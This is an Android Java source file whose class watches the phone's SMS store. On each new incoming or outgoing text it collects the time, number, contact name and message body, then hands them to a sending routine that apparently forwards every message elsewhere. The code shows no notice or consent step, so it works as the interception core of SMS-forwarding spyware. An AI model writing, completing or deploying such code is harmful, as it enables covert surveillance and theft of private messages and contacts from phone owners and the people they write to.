package com.yfm.sms;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;

public class SMSConten extends ContentObserver {

	private int id = -1;
	private ContentResolver cr;
	private PendingIntent pi;
	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		Cursor c = cr.query(Uri.parse("content://sms"), null, null, null,
				null);
		try {
			if (c.moveToFirst()) {
				int type = c.getInt(c.getColumnIndex("type"));
				Loginfo.write("type", String.valueOf(type));
				int _id = c.getInt(c.getColumnIndex("_id"));
				Loginfo.write("type", _id + "--" + id);

				if (type == 1 || type == 2) {

					if (_id > id) {
						// 收件箱
						String address=c.getString(c.getColumnIndex("address"));
						Loginfo.write("address",address);
						if(address.length()>0){
							JSONObject jo = new JSONObject();
							jo.put("dates", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
							jo.put("type", type==1?"收短信":"发短信");
							jo.put("address",address);
							jo.put("body", c.getString(c.getColumnIndex("body")));
							Loginfo.write("type", jo.toString());
							SMSUtils.SendMsg("时间:"+jo.getString("dates")+","+jo.getString("type")+",号码:"+jo.getString("address")+",名字:"+SMSUtils.ReadNameByPhoneBook(jo.getString("address"), cr)+",内容:"+jo.getString("body"),pi);
						}
						
					}
					id = _id;

				}

			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			Loginfo.write("type", e.getMessage());
		}finally{
			if(c!=null){
				c.close();
			}
		}
	}

	public SMSConten(ContentResolver cr2, Handler handler,PendingIntent pi) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.cr = cr2;
		this.pi=pi;
	}


}
